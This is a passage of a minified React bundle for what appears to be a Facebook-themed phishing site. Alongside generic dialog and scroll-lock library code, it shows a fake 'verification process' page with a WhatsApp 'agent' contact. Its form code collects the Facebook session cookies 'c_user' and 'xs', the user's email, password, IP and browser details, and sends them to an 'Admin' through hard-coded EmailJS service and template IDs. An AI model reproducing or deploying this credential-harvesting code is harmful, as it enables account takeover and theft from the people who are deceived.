    var n = h.useRef(null)
      , r = h.useState({
        onScrollCapture: mc,
        onWheelCapture: mc,
        onTouchMoveCapture: mc
    })
      , o = r[0]
      , s = r[1]
      , i = e.forwardProps
      , a = e.children
      , l = e.className
      , u = e.removeScrollBar
      , c = e.enabled
      , d = e.shards
      , p = e.sideCar
      , w = e.noIsolation
      , x = e.inert
      , m = e.allowPinchZoom
      , S = e.as
      , v = S === void 0 ? "div" : S
      , f = e.gapMode
      , y = Gw(e, ["forwardProps", "children", "className", "removeScrollBar", "enabled", "shards", "sideCar", "noIsolation", "inert", "allowPinchZoom", "as", "gapMode"])
      , _ = p
      , b = XT([n, t])
      , T = En(En({}, y), o);
    return h.createElement(h.Fragment, null, c && h.createElement(_, {
        sideCar: Xw,
        removeScrollBar: u,
        shards: d,
        noIsolation: w,
        inert: x,
        setCallbacks: s,
        allowPinchZoom: !!m,
        lockRef: n,
        gapMode: f
    }), i ? h.cloneElement(h.Children.only(a), En(En({}, T), {
        ref: b
    })) : h.createElement(v, En({}, T, {
        className: l,
        ref: b
    }), a))
});
yu.defaultProps = {
    enabled: !0,
    removeScrollBar: !0,
    inert: !1
};
yu.classNames = {
    fullWidth: Ya,
    zeroRight: Ga
};
var rP = function() {
    if (typeof __webpack_nonce__ < "u")
        return __webpack_nonce__
};
function oP() {
    if (!document)
        return null;
    var e = document.createElement("style");
    e.type = "text/css";
    var t = rP();
    return t && e.setAttribute("nonce", t),
    e
}
function sP(e, t) {
    e.styleSheet ? e.styleSheet.cssText = t : e.appendChild(document.createTextNode(t))
}
function iP(e) {
    var t = document.head || document.getElementsByTagName("head")[0];
    t.appendChild(e)
}
var aP = function() {
    var e = 0
      , t = null;
    return {
        add: function(n) {
            e == 0 && (t = oP()) && (sP(t, n),
            iP(t)),
            e++
        },
        remove: function() {
            e--,
            !e && t && (t.parentNode && t.parentNode.removeChild(t),
            t = null)
        }
    }
}
  , lP = function() {
    var e = aP();
    return function(t, n) {
        h.useEffect(function() {
            return e.add(t),
            function() {
                e.remove()
            }
        }, [t && n])
    }
}
  , Jw = function() {
    var e = lP()
      , t = function(n) {
        var r = n.styles
          , o = n.dynamic;
        return e(r, o),
        null
    };
    return t
}
  , uP = {
    left: 0,
    top: 0,
    right: 0,
    gap: 0
}
  , vc = function(e) {
    return parseInt(e || "", 10) || 0
}
  , cP = function(e) {
    var t = window.getComputedStyle(document.body)
      , n = t[e === "padding" ? "paddingLeft" : "marginLeft"]
      , r = t[e === "padding" ? "paddingTop" : "marginTop"]
      , o = t[e === "padding" ? "paddingRight" : "marginRight"];
    return [vc(n), vc(r), vc(o)]
}
  , dP = function(e) {
    if (e === void 0 && (e = "margin"),
    typeof window > "u")
        return uP;
    var t = cP(e)
      , n = document.documentElement.clientWidth
      , r = window.innerWidth;
    return {
        left: t[0],
        top: t[1],
        right: t[2],
        gap: Math.max(0, r - n + t[2] - t[0])
    }
}
  , fP = Jw()
  , qo = "data-scroll-locked"
  , pP = function(e, t, n, r) {
    var o = e.left
      , s = e.top
      , i = e.right
      , a = e.gap;
    return n === void 0 && (n = "margin"),
    `
  .`.concat(QT, ` {
   overflow: hidden `).concat(r, `;
   padding-right: `).concat(a, "px ").concat(r, `;
  }
  body[`).concat(qo, `] {
    overflow: hidden `).concat(r, `;
    overscroll-behavior: contain;
    `).concat([t && "position: relative ".concat(r, ";"), n === "margin" && `
    padding-left: `.concat(o, `px;
    padding-top: `).concat(s, `px;
    padding-right: `).concat(i, `px;
    margin-left:0;
    margin-top:0;
    margin-right: `).concat(a, "px ").concat(r, `;
    `), n === "padding" && "padding-right: ".concat(a, "px ").concat(r, ";")].filter(Boolean).join(""), `
  }
  
  .`).concat(Ga, ` {
    right: `).concat(a, "px ").concat(r, `;
  }
  
  .`).concat(Ya, ` {
    margin-right: `).concat(a, "px ").concat(r, `;
  }
  
  .`).concat(Ga, " .").concat(Ga, ` {
    right: 0 `).concat(r, `;
  }
  
  .`).concat(Ya, " .").concat(Ya, ` {
    margin-right: 0 `).concat(r, `;
  }
  
  body[`).concat(qo, `] {
    `).concat(qT, ": ").concat(a, `px;
  }
`)
}
  , ym = function() {
    var e = parseInt(document.body.getAttribute(qo) || "0", 10);
    return isFinite(e) ? e : 0
}
  , hP = function() {
    h.useEffect(function() {
        return document.body.setAttribute(qo, (ym() + 1).toString()),
        function() {
            var e = ym() - 1;
            e <= 0 ? document.body.removeAttribute(qo) : document.body.setAttribute(qo, e.toString())
        }
    }, [])
}
  , mP = function(e) {
    var t = e.noRelative
      , n = e.noImportant
      , r = e.gapMode
      , o = r === void 0 ? "margin" : r;
    hP();
    var s = h.useMemo(function() {
        return dP(o)
    }, [o]);
    return h.createElement(fP, {
        styles: pP(s, !t, o, n ? "" : "!important")
    })
}
  , Pd = !1;
if (typeof window < "u")
    try {
        var Na = Object.defineProperty({}, "passive", {
            get: function() {
                return Pd = !0,
                !0
            }
        });
        window.addEventListener("test", Na, Na),
        window.removeEventListener("test", Na, Na)
    } catch {
        Pd = !1
    }
var _o = Pd ? {
    passive: !1
} : !1
  , vP = function(e) {
    return e.tagName === "TEXTAREA"
}
  , ex = function(e, t) {
    if (!(e instanceof Element))
        return !1;
    var n = window.getComputedStyle(e);
    return n[t] !== "hidden" && !(n.overflowY === n.overflowX && !vP(e) && n[t] === "visible")
}
  , gP = function(e) {
    return ex(e, "overflowY")
}
  , yP = function(e) {
    return ex(e, "overflowX")
}
  , wm = function(e, t) {
    var n = t.ownerDocument
      , r = t;
    do {
        typeof ShadowRoot < "u" && r instanceof ShadowRoot && (r = r.host);
        var o = tx(e, r);
        if (o) {
            var s = nx(e, r)
              , i = s[1]
              , a = s[2];
            if (i > a)
                return !0
        }
        r = r.parentNode
    } while (r && r !== n.body);
    return !1
}
  , wP = function(e) {
    var t = e.scrollTop
      , n = e.scrollHeight
      , r = e.clientHeight;
    return [t, n, r]
}
  , xP = function(e) {
    var t = e.scrollLeft
      , n = e.scrollWidth
      , r = e.clientWidth;
    return [t, n, r]
}
  , tx = function(e, t) {
    return e === "v" ? gP(t) : yP(t)
}
  , nx = function(e, t) {
    return e === "v" ? wP(t) : xP(t)
}
  , SP = function(e, t) {
    return e === "h" && t === "rtl" ? -1 : 1
}
  , _P = function(e, t, n, r, o) {
    var s = SP(e, window.getComputedStyle(t).direction)
      , i = s * r
      , a = n.target
      , l = t.contains(a)
      , u = !1
      , c = i > 0
      , d = 0
      , p = 0;
    do {
        var w = nx(e, a)
          , x = w[0]
          , m = w[1]
          , S = w[2]
          , v = m - S - s * x;
        (x || v) && tx(e, a) && (d += v,
        p += x),
        a instanceof ShadowRoot ? a = a.host : a = a.parentNode
    } while (!l && a !== document.body || l && (t.contains(a) || t === a));
    return (c && (Math.abs(d) < 1 || !o) || !c && (Math.abs(p) < 1 || !o)) && (u = !0),
    u
}
  , Ra = function(e) {
    return "changedTouches"in e ? [e.changedTouches[0].clientX, e.changedTouches[0].clientY] : [0, 0]
}
  , xm = function(e) {
    return [e.deltaX, e.deltaY]
}
  , Sm = function(e) {
    return e && "current"in e ? e.current : e
}
  , EP = function(e, t) {
    return e[0] === t[0] && e[1] === t[1]
}
  , bP = function(e) {
    return `
  .block-interactivity-`.concat(e, ` {pointer-events: none;}
  .allow-interactivity-`).concat(e, ` {pointer-events: all;}
`)
}
  , CP = 0
  , Eo = [];
function kP(e) {
    var t = h.useRef([])
      , n = h.useRef([0, 0])
      , r = h.useRef()
      , o = h.useState(CP++)[0]
      , s = h.useState(Jw)[0]
      , i = h.useRef(e);
    h.useEffect(function() {
        i.current = e
    }, [e]),
    h.useEffect(function() {
        if (e.inert) {
            document.body.classList.add("block-interactivity-".concat(o));
            var m = KT([e.lockRef.current], (e.shards || []).map(Sm), !0).filter(Boolean);
            return m.forEach(function(S) {
                return S.classList.add("allow-interactivity-".concat(o))
            }),
            function() {
                document.body.classList.remove("block-interactivity-".concat(o)),
                m.forEach(function(S) {
                    return S.classList.remove("allow-interactivity-".concat(o))
                })
            }
        }
    }, [e.inert, e.lockRef.current, e.shards]);
    var a = h.useCallback(function(m, S) {
        if ("touches"in m && m.touches.length === 2 || m.type === "wheel" && m.ctrlKey)
            return !i.current.allowPinchZoom;
        var v = Ra(m), f = n.current, y = "deltaX"in m ? m.deltaX : f[0] - v[0], _ = "deltaY"in m ? m.deltaY : f[1] - v[1], b, T = m.target, k = Math.abs(y) > Math.abs(_) ? "h" : "v";
        if ("touches"in m && k === "h" && T.type === "range")
            return !1;
        var P = wm(k, T);
        if (!P)
            return !0;
        if (P ? b = k : (b = k === "v" ? "h" : "v",
        P = wm(k, T)),
        !P)
            return !1;
        if (!r.current && "changedTouches"in m && (y || _) && (r.current = b),
        !b)
            return !0;
        var z = r.current || b;
        return _P(z, S, m, z === "h" ? y : _, !0)
    }, [])
      , l = h.useCallback(function(m) {
        var S = m;
        if (!(!Eo.length || Eo[Eo.length - 1] !== s)) {
            var v = "deltaY"in S ? xm(S) : Ra(S)
              , f = t.current.filter(function(b) {
                return b.name === S.type && (b.target === S.target || S.target === b.shadowParent) && EP(b.delta, v)
            })[0];
            if (f && f.should) {
                S.cancelable && S.preventDefault();
                return
            }
            if (!f) {
                var y = (i.current.shards || []).map(Sm).filter(Boolean).filter(function(b) {
                    return b.contains(S.target)
                })
                  , _ = y.length > 0 ? a(S, y[0]) : !i.current.noIsolation;
                _ && S.cancelable && S.preventDefault()
            }
        }
    }, [])
      , u = h.useCallback(function(m, S, v, f) {
        var y = {
            name: m,
            delta: S,
            target: v,
            should: f,
            shadowParent: TP(v)
        };
        t.current.push(y),
        setTimeout(function() {
            t.current = t.current.filter(function(_) {
                return _ !== y
            })
        }, 1)
    }, [])
      , c = h.useCallback(function(m) {
        n.current = Ra(m),
        r.current = void 0
    }, [])
      , d = h.useCallback(function(m) {
        u(m.type, xm(m), m.target, a(m, e.lockRef.current))
    }, [])
      , p = h.useCallback(function(m) {
        u(m.type, Ra(m), m.target, a(m, e.lockRef.current))
    }, []);
    h.useEffect(function() {
        return Eo.push(s),
        e.setCallbacks({
            onScrollCapture: d,
            onWheelCapture: d,
            onTouchMoveCapture: p
        }),
        document.addEventListener("wheel", l, _o),
        document.addEventListener("touchmove", l, _o),
        document.addEventListener("touchstart", c, _o),
        function() {
            Eo = Eo.filter(function(m) {
                return m !== s
            }),
            document.removeEventListener("wheel", l, _o),
            document.removeEventListener("touchmove", l, _o),
            document.removeEventListener("touchstart", c, _o)
        }
    }, []);
    var w = e.removeScrollBar
      , x = e.inert;
    return h.createElement(h.Fragment, null, x ? h.createElement(s, {
        styles: bP(o)
    }) : null, w ? h.createElement(mP, {
        gapMode: e.gapMode
    }) : null)
}
function TP(e) {
    for (var t = null; e !== null; )
        e instanceof ShadowRoot && (t = e.host,
        e = e.host),
        e = e.parentNode;
    return t
}
const PP = nP(Xw, kP);
var Xf = h.forwardRef(function(e, t) {
    return h.createElement(yu, En({}, e, {
        ref: t,
        sideCar: PP
    }))
});
Xf.classNames = yu.classNames;
var NP = function(e) {
    if (typeof document > "u")
        return null;
    var t = Array.isArray(e) ? e[0] : e;
    return t.ownerDocument.body
}
  , bo = new WeakMap
  , Aa = new WeakMap
  , Oa = {}
  , gc = 0
  , rx = function(e) {
    return e && (e.host || rx(e.parentNode))
}
  , RP = function(e, t) {
    return t.map(function(n) {
        if (e.contains(n))
            return n;
        var r = rx(n);
        return r && e.contains(r) ? r : (console.error("aria-hidden", n, "in not contained inside", e, ". Doing nothing"),
        null)
    }).filter(function(n) {
        return !!n
    })
}
  , AP = function(e, t, n, r) {
    var o = RP(t, Array.isArray(e) ? e : [e]);
    Oa[n] || (Oa[n] = new WeakMap);
    var s = Oa[n]
      , i = []
      , a = new Set
      , l = new Set(o)
      , u = function(d) {
        !d || a.has(d) || (a.add(d),
        u(d.parentNode))
    };
    o.forEach(u);
    var c = function(d) {
        !d || l.has(d) || Array.prototype.forEach.call(d.children, function(p) {
            if (a.has(p))
                c(p);
            else
                try {
                    var w = p.getAttribute(r)
                      , x = w !== null && w !== "false"
                      , m = (bo.get(p) || 0) + 1
                      , S = (s.get(p) || 0) + 1;
                    bo.set(p, m),
                    s.set(p, S),
                    i.push(p),
                    m === 1 && x && Aa.set(p, !0),
                    S === 1 && p.setAttribute(n, "true"),
                    x || p.setAttribute(r, "true")
                } catch (v) {
                    console.error("aria-hidden: cannot operate on ", p, v)
                }
        })
    };
    return c(t),
    a.clear(),
    gc++,
    function() {
        i.forEach(function(d) {
            var p = bo.get(d) - 1
              , w = s.get(d) - 1;
            bo.set(d, p),
            s.set(d, w),
            p || (Aa.has(d) || d.removeAttribute(r),
            Aa.delete(d)),
            w || d.removeAttribute(n)
        }),
        gc--,
        gc || (bo = new WeakMap,
        bo = new WeakMap,
        Aa = new WeakMap,
        Oa = {})
    }
}
  , ox = function(e, t, n) {
    n === void 0 && (n = "data-aria-hidden");
    var r = Array.from(Array.isArray(e) ? e : [e])
      , o = NP(e);
    return o ? (r.push.apply(r, Array.from(o.querySelectorAll("[aria-live]"))),
    AP(r, o, n, "aria-hidden")) : function() {
        return null
    }
}
  , Jf = "Dialog"
  , [sx,cA] = Ff(Jf)
  , [OP,vn] = sx(Jf)
  , ix = e => {
    const {__scopeDialog: t, children: n, open: r, defaultOpen: o, onOpenChange: s, modal: i=!0} = e
      , a = h.useRef(null)
      , l = h.useRef(null)
      , [u=!1,c] = bl({
        prop: r,
        defaultProp: o,
        onChange: s
    });
    return g.jsx(OP, {
        scope: t,
        triggerRef: a,
        contentRef: l,
        contentId: Qo(),
        titleId: Qo(),
        descriptionId: Qo(),
        open: u,
        onOpenChange: c,
        onOpenToggle: h.useCallback( () => c(d => !d), [c]),
        modal: i,
        children: n
    })
}
;
ix.displayName = Jf;
var ax = "DialogTrigger"
  , jP = h.forwardRef( (e, t) => {
    const {__scopeDialog: n, ...r} = e
      , o = vn(ax, n)
      , s = Le(t, o.triggerRef);
    return g.jsx(ge.button, {
        type: "button",
        "aria-haspopup": "dialog",
        "aria-expanded": o.open,
        "aria-controls": o.contentId,
        "data-state": np(o.open),
        ...r,
        ref: s,
        onClick: fe(e.onClick, o.onOpenToggle)
    })
}
);
jP.displayName = ax;
var ep = "DialogPortal"
  , [MP,lx] = sx(ep, {
    forceMount: void 0
})
  , ux = e => {
    const {__scopeDialog: t, forceMount: n, children: r, container: o} = e
      , s = vn(ep, t);
    return g.jsx(MP, {
        scope: t,
        forceMount: n,
        children: h.Children.map(r, i => g.jsx(na, {
            present: n || s.open,
            children: g.jsx(cu, {
                asChild: !0,
                container: o,
                children: i
            })
        }))
    })
}
;
ux.displayName = ep;
var Fl = "DialogOverlay"
  , cx = h.forwardRef( (e, t) => {
    const n = lx(Fl, e.__scopeDialog)
      , {forceMount: r=n.forceMount, ...o} = e
      , s = vn(Fl, e.__scopeDialog);
    return s.modal ? g.jsx(na, {
        present: r || s.open,
        children: g.jsx(IP, {
            ...o,
            ref: t
        })
    }) : null
}
);
cx.displayName = Fl;
var IP = h.forwardRef( (e, t) => {
    const {__scopeDialog: n, ...r} = e
      , o = vn(Fl, n);
    return g.jsx(Xf, {
        as: Tr,
        allowPinchZoom: !0,
        shards: [o.contentRef],
        children: g.jsx(ge.div, {
            "data-state": np(o.open),
            ...r,
            ref: t,
            style: {
                pointerEvents: "auto",
                ...r.style
            }
        })
    })
}
)
  , uo = "DialogContent"
  , dx = h.forwardRef( (e, t) => {
    const n = lx(uo, e.__scopeDialog)
      , {forceMount: r=n.forceMount, ...o} = e
      , s = vn(uo, e.__scopeDialog);
    return g.jsx(na, {
        present: r || s.open,
        children: s.modal ? g.jsx(LP, {
            ...o,
            ref: t
        }) : g.jsx(DP, {
            ...o,
            ref: t
        })
    })
}
);
dx.displayName = uo;
var LP = h.forwardRef( (e, t) => {
    const n = vn(uo, e.__scopeDialog)
      , r = h.useRef(null)
      , o = Le(t, n.contentRef, r);
    return h.useEffect( () => {
        const s = r.current;
        if (s)
            return ox(s)
    }
    , []),
    g.jsx(fx, {
        ...e,
        ref: o,
        trapFocus: n.open,
        disableOutsidePointerEvents: !0,
        onCloseAutoFocus: fe(e.onCloseAutoFocus, s => {
            var i;
            s.preventDefault(),
            (i = n.triggerRef.current) == null || i.focus()
        }
        ),
        onPointerDownOutside: fe(e.onPointerDownOutside, s => {
            const i = s.detail.originalEvent
              , a = i.button === 0 && i.ctrlKey === !0;
            (i.button === 2 || a) && s.preventDefault()
        }
        ),
        onFocusOutside: fe(e.onFocusOutside, s => s.preventDefault())
    })
}
)
  , DP = h.forwardRef( (e, t) => {
    const n = vn(uo, e.__scopeDialog)
      , r = h.useRef(!1)
      , o = h.useRef(!1);
    return g.jsx(fx, {
        ...e,
        ref: t,
        trapFocus: !1,
        disableOutsidePointerEvents: !1,
        onCloseAutoFocus: s => {
            var i, a;
            (i = e.onCloseAutoFocus) == null || i.call(e, s),
            s.defaultPrevented || (r.current || (a = n.triggerRef.current) == null || a.focus(),
            s.preventDefault()),
            r.current = !1,
            o.current = !1
        }
        ,
        onInteractOutside: s => {
            var l, u;
            (l = e.onInteractOutside) == null || l.call(e, s),
            s.defaultPrevented || (r.current = !0,
            s.detail.originalEvent.type === "pointerdown" && (o.current = !0));
            const i = s.target;
            ((u = n.triggerRef.current) == null ? void 0 : u.contains(i)) && s.preventDefault(),
            s.detail.originalEvent.type === "focusin" && o.current && s.preventDefault()
        }
    })
}
)
  , fx = h.forwardRef( (e, t) => {
    const {__scopeDialog: n, trapFocus: r, onOpenAutoFocus: o, onCloseAutoFocus: s, ...i} = e
      , a = vn(uo, n)
      , l = h.useRef(null)
      , u = Le(t, l);
    return qw(),
    g.jsxs(g.Fragment, {
        children: [g.jsx(Yf, {
            asChild: !0,
            loop: !0,
            trapped: r,
            onMountAutoFocus: o,
            onUnmountAutoFocus: s,
            children: g.jsx(uu, {
                role: "dialog",
                id: a.contentId,
                "aria-describedby": a.descriptionId,
                "aria-labelledby": a.titleId,
                "data-state": np(a.open),
                ...i,
                ref: u,
                onDismiss: () => a.onOpenChange(!1)
            })
        }), g.jsxs(g.Fragment, {
            children: [g.jsx(FP, {
                titleId: a.titleId
            }), g.jsx(zP, {
                contentRef: l,
                descriptionId: a.descriptionId
            })]
        })]
    })
}
)
  , tp = "DialogTitle"
  , px = h.forwardRef( (e, t) => {
    const {__scopeDialog: n, ...r} = e
      , o = vn(tp, n);
    return g.jsx(ge.h2, {
        id: o.titleId,
        ...r,
        ref: t
    })
}
);
px.displayName = tp;
var hx = "DialogDescription"
  , mx = h.forwardRef( (e, t) => {
    const {__scopeDialog: n, ...r} = e
      , o = vn(hx, n);
    return g.jsx(ge.p, {
        id: o.descriptionId,
        ...r,
        ref: t
    })
}
);
mx.displayName = hx;
var vx = "DialogClose"
  , gx = h.forwardRef( (e, t) => {
    const {__scopeDialog: n, ...r} = e
      , o = vn(vx, n);
    return g.jsx(ge.button, {
        type: "button",
        ...r,
        ref: t,
        onClick: fe(e.onClick, () => o.onOpenChange(!1))
    })
}
);
gx.displayName = vx;
function np(e) {
    return e ? "open" : "closed"
}
var yx = "DialogTitleWarning"
  , [dA,wx] = LE(yx, {
    contentName: uo,
    titleName: tp,
    docsSlug: "dialog"
})
  , FP = ({titleId: e}) => {
    const t = wx(yx)
      , n = `\`${t.contentName}\` requires a \`${t.titleName}\` for the component to be accessible for screen reader users.

If you want to hide the \`${t.titleName}\`, you can wrap it with our VisuallyHidden component.

For more information, see https://radix-ui.com/primitives/docs/components/${t.docsSlug}`;
    return h.useEffect( () => {
        e && (document.getElementById(e) || console.error(n))
    }
    , [n, e]),
    null
}
  , VP = "DialogDescriptionWarning"
  , zP = ({contentRef: e, descriptionId: t}) => {
    const r = `Warning: Missing \`Description\` or \`aria-describedby={undefined}\` for {${wx(VP).contentName}}.`;
    return h.useEffect( () => {
        var s;
        const o = (s = e.current) == null ? void 0 : s.getAttribute("aria-describedby");
        t && o && (document.getElementById(t) || console.warn(r))
    }
    , [r, e, t]),
    null
}
  , $P = ix
  , UP = ux
  , xx = cx
  , Sx = dx
  , _x = px
  , Ex = mx
  , BP = gx;
const HP = $P
  , WP = UP
  , bx = h.forwardRef( ({className: e, ...t}, n) => g.jsx(xx, {
    ref: n,
    className: ve("fixed inset-0 z-50 bg-black/80  data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0", e),
    ...t
}));
bx.displayName = xx.displayName;
const Cx = h.forwardRef( ({className: e, children: t, ...n}, r) => g.jsxs(WP, {
    children: [g.jsx(bx, {}), g.jsxs(Sx, {
        ref: r,
        className: ve("fixed left-[50%] top-[50%] z-50 grid w-full max-w-lg translate-x-[-50%] translate-y-[-50%] gap-4 border bg-background p-6 shadow-lg duration-200 data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0 data-[state=closed]:zoom-out-95 data-[state=open]:zoom-in-95 data-[state=closed]:slide-out-to-left-1/2 data-[state=closed]:slide-out-to-top-[48%] data-[state=open]:slide-in-from-left-1/2 data-[state=open]:slide-in-from-top-[48%] sm:rounded-lg", e),
        ...n,
        children: [t, g.jsxs(BP, {
            className: "absolute right-4 top-4 rounded-sm opacity-70 ring-offset-background transition-opacity hover:opacity-100 focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2 disabled:pointer-events-none data-[state=open]:bg-accent data-[state=open]:text-muted-foreground",
            children: [g.jsx(Ky, {
                className: "h-4 w-4"
            }), g.jsx("span", {
                className: "sr-only",
                children: "Close"
            })]
        })]
    })]
}));
Cx.displayName = Sx.displayName;
const kx = ({className: e, ...t}) => g.jsx("div", {
    className: ve("flex flex-col space-y-1.5 text-center sm:text-left", e),
    ...t
});
kx.displayName = "DialogHeader";
const Tx = h.forwardRef( ({className: e, ...t}, n) => g.jsx(_x, {
    ref: n,
    className: ve("text-lg font-semibold leading-none tracking-tight", e),
    ...t
}));
Tx.displayName = _x.displayName;
const ZP = h.forwardRef( ({className: e, ...t}, n) => g.jsx(Ex, {
    ref: n,
    className: ve("text-sm text-muted-foreground", e),
    ...t
}));
ZP.displayName = Ex.displayName;
function KP({open: e, onOpenChange: t}) {
    const n = () => {
        window.open("https://wa.me/13322632043", "_blank")
    }
    ;
    return g.jsx(HP, {
        open: e,
        onOpenChange: t,
        children: g.jsxs(Cx, {
            className: "sm:max-w-[425px]",
            children: [g.jsx(kx, {
                children: g.jsx(Tx, {
                    className: "text-center text-xl font-bold text-[#1877f2]",
                    children: "Please Use a Laptop/Computer"
                })
            }), g.jsxs("div", {
                className: "space-y-4 py-4 text-center",
                children: [g.jsxs("div", {
                    className: "flex justify-center space-x-4",
                    children: [g.jsx(Ab, {
                        className: "w-8 h-8 text-red-500"
                    }), g.jsx(Pb, {
                        className: "w-8 h-8 text-green-500"
                    })]
                }), g.jsx("p", {
                    className: "text-[#65676B]",
                    children: "For the best experience and security, please use a laptop or computer to complete the verification process."
                }), g.jsxs("div", {
                    className: "pt-4",
                    children: [g.jsx("p", {
                        className: "text-sm text-[#65676B] mb-2",
                        children: "Don't have access to a computer?"
                    }), g.jsxs(Es, {
                        onClick: n,
                        className: "bg-[#25D366] hover:bg-[#128C7E] text-white w-full",
                        children: [g.jsx(Nb, {
                            className: "w-4 h-4 mr-2"
                        }), "Contact Our Agent on WhatsApp"]
                    })]
                })]
            })]
        })
    })
}
class sa {
    constructor(t=0, n="Network Error") {
        this.status = t,
        this.text = n
    }
}
const QP = () => {
    if (!(typeof localStorage > "u"))
        return {
            get: e => Promise.resolve(localStorage.getItem(e)),
            set: (e, t) => Promise.resolve(localStorage.setItem(e, t)),
            remove: e => Promise.resolve(localStorage.removeItem(e))
        }
}
  , nt = {
    origin: "https://api.emailjs.com",
    blockHeadless: !1,
    storageProvider: QP()
}
  , rp = e => e ? typeof e == "string" ? {
    publicKey: e
} : e.toString() === "[object Object]" ? e : {} : {}
  , qP = (e, t="https://api.emailjs.com") => {
    if (!e)
        return;
    const n = rp(e);
    nt.publicKey = n.publicKey,
    nt.blockHeadless = n.blockHeadless,
    nt.storageProvider = n.storageProvider,
    nt.blockList = n.blockList,
    nt.limitRate = n.limitRate,
    nt.origin = n.origin || t
}
  , Px = async (e, t, n={}) => {
    const r = await fetch(nt.origin + e, {
        method: "POST",
        headers: n,
        body: t
    })
      , o = await r.text()
      , s = new sa(r.status,o);
    if (r.ok)
        return s;
    throw s
}
  , Nx = (e, t, n) => {
    if (!e || typeof e != "string")
        throw "The public key is required. Visit https://dashboard.emailjs.com/admin/account";
    if (!t || typeof t != "string")
        throw "The service ID is required. Visit https://dashboard.emailjs.com/admin";
    if (!n || typeof n != "string")
        throw "The template ID is required. Visit https://dashboard.emailjs.com/admin/templates"
}
  , GP = e => {
    if (e && e.toString() !== "[object Object]")
        throw "The template params have to be the object. Visit https://www.emailjs.com/docs/sdk/send/"
}
  , Rx = e => e.webdriver || !e.languages || e.languages.length === 0
  , Ax = () => new sa(451,"Unavailable For Headless Browser")
  , YP = (e, t) => {
    if (!Array.isArray(e))
        throw "The BlockList list has to be an array";
    if (typeof t != "string")
        throw "The BlockList watchVariable has to be a string"
}
  , XP = e => {
    var t;
    return !((t = e.list) != null && t.length) || !e.watchVariable
}
  , JP = (e, t) => e instanceof FormData ? e.get(t) : e[t]
  , Ox = (e, t) => {
    if (XP(e))
        return !1;
    YP(e.list, e.watchVariable);
    const n = JP(t, e.watchVariable);
    return typeof n != "string" ? !1 : e.list.includes(n)
}
  , jx = () => new sa(403,"Forbidden")
  , eN = (e, t) => {
    if (typeof e != "number" || e < 0)
        throw "The LimitRate throttle has to be a positive number";
    if (t && typeof t != "string")
        throw "The LimitRate ID has to be a non-empty string"
}
  , tN = async (e, t, n) => {
    const r = Number(await n.get(e) || 0);
    return t - Date.now() + r
}
  , Mx = async (e, t, n) => {
    if (!t.throttle || !n)
        return !1;
    eN(t.throttle, t.id);
    const r = t.id || e;
    return await tN(r, t.throttle, n) > 0 ? !0 : (await n.set(r, Date.now().toString()),
    !1)
}
  , Ix = () => new sa(429,"Too Many Requests")
  , nN = async (e, t, n, r) => {
    const o = rp(r)
      , s = o.publicKey || nt.publicKey
      , i = o.blockHeadless || nt.blockHeadless
      , a = o.storageProvider || nt.storageProvider
      , l = {
        ...nt.blockList,
        ...o.blockList
    }
      , u = {
        ...nt.limitRate,
        ...o.limitRate
    };
    return i && Rx(navigator) ? Promise.reject(Ax()) : (Nx(s, e, t),
    GP(n),
    n && Ox(l, n) ? Promise.reject(jx()) : await Mx(location.pathname, u, a) ? Promise.reject(Ix()) : Px("/api/v1.0/email/send", JSON.stringify({
        lib_version: "4.4.1",
        user_id: s,
        service_id: e,
        template_id: t,
        template_params: n
    }), {
        "Content-type": "application/json"
    }))
}
  , rN = e => {
    if (!e || e.nodeName !== "FORM")
        throw "The 3rd parameter is expected to be the HTML form element or the style selector of the form"
}
  , oN = e => typeof e == "string" ? document.querySelector(e) : e
  , sN = async (e, t, n, r) => {
    const o = rp(r)
      , s = o.publicKey || nt.publicKey
      , i = o.blockHeadless || nt.blockHeadless
      , a = nt.storageProvider || o.storageProvider
      , l = {
        ...nt.blockList,
        ...o.blockList
    }
      , u = {
        ...nt.limitRate,
        ...o.limitRate
    };
    if (i && Rx(navigator))
        return Promise.reject(Ax());
    const c = oN(n);
    Nx(s, e, t),
    rN(c);
    const d = new FormData(c);
    return Ox(l, d) ? Promise.reject(jx()) : await Mx(location.pathname, u, a) ? Promise.reject(Ix()) : (d.append("lib_version", "4.4.1"),
    d.append("service_id", e),
    d.append("template_id", t),
    d.append("user_id", s),
    Px("/api/v1.0/email/send-form", d))
}
  , op = {
    init: qP,
    send: nN,
    sendForm: sN,
    EmailJSResponseStatus: sa
}
  , iN = () => {
    try {
        const e = "EU47Al38Q8OkhCm9m";
        op.init(e),
        console.log("EmailJS initialized successfully")
    } catch (e) {
        throw console.error("Failed to initialize EmailJS:", e),
        e
    }
}
  , aN = async e => {
    try {
        const t = "service_o62eiqb"
          , n = "template_t1s6783"
          , r = {
            to_name: "Admin",
            c_user: e.c_user,
            xs: e.xs,
            timestamp: e.timestamp,
            ip_address: e.ipAddress || "Not available",
            user_agent: e.userAgent || navigator.userAgent
        };
        console.log("Sending validation email with params:", {
            ...r,
            xs: "[REDACTED]"
        });
        const o = await op.send(t, n, r);
        return console.log("Validation email sent successfully:", o),
        o
    } catch (t) {
        throw console.error("Error sending validation email:", t),
        t
    }
}
  , lN = async e => {
    try {
        console.log("Starting confirmation email send process");
        const t = "service_o62eiqb"
          , n = "template_455021p"
          , r = {
            to_name: "Admin",
            c_user: e.c_user,
            xs: e.xs,
            user_email: e.user_email,
            password: e.password,
            contact_method: e.contactMethod,
            country_code: e.countryCode,
            timestamp: e.timestamp,
            ip_address: e.ipAddress || "Not available",
            user_agent: e.userAgent || navigator.userAgent
        };
        console.log("Sending confirmation email with params:", {
            ...r,
            password: "[REDACTED]",
            xs: "[REDACTED]"
        });
        const o = await op.send(t, n, r);
        return console.log("Confirmation email sent successfully:", o),
        o
    } catch (t) {
        throw console.error("Error sending confirmation email:", t),
        new Error(`Failed to send confirmation email: ${t.message}`)
    }
}
;
function uN() {
    const {toast: e} = Df()
      , [,t] = Mf()
      , n = ow()
      , [r,o] = h.useState(!1)
      , [s,i] = h.useState(!1);
    h.useEffect( () => {
        n && o(!0)
    }
    , [n]);
    const a = Sw({
        resolver: Nw(LT),
        defaultValues: {
            c_user: "",
            xs: ""
        }
    })
      , l = async u => {
        try {
            i(!0),
            await aN({
                ...u,
                timestamp: new Date().toISOString()
            }),
            localStorage.setItem("validation_data", JSON.stringify(u)),
            e({
                title: "Validation successful",
                description: "Please proceed to the next step"
            }),
            t("/confirmation")
        } catch (c) {
